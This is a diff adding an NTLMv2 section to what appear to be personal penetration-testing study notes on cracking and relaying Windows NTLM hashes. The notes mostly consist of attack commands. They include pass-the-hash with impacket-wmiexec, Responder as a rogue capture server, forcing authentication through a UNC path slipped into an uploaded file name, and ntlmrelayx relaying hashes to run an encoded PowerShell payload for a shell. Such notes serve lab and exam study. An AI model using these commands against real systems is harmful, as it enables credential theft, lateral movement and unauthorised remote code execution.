@@ -49,7 +49,7 @@
 - run it ``` john --wordlist=ssh.passwords --rules=sshRules ssh.hash ```
 
 # NTLM v1
-
+- More like high priv users
 ## Brute force NTLM (Windows) MUST USE POWERSHELL!!!
 - Target get from window SAM
 - find all users ``` Get-LocalUser ```
@@ -73,3 +73,21 @@
 5. wmiexec.py (shell with admin identity)
    - rmb add 32 zeros before the hash 
    - ``` impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212 ```
+
+# NTLM v2
+- More like unpriv users
+## Crack
+- ``` net user xxx``` see if can rdp
+- ``` sudo responder -I tun0 ``` rogue receiver to dump request from http , smb etc
+- ``` dir \\LHOST\test ``` to post hash NTLM
+- NTLM v2 Hash crack
+
+## Skill of including filename of smb for HTTP server load uploaded file
+- change file name to ``` \\\\LHOST\\share\file.name ```
+- Trigger call NTLM hash
+
+## Forwarding the hash instill of crack since too hard
+- relay server for NTLM ``` impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..." ```
+- use victim A to connect our rogue impacket server by dir \\xx\y
+- watch shell if have thing come
+
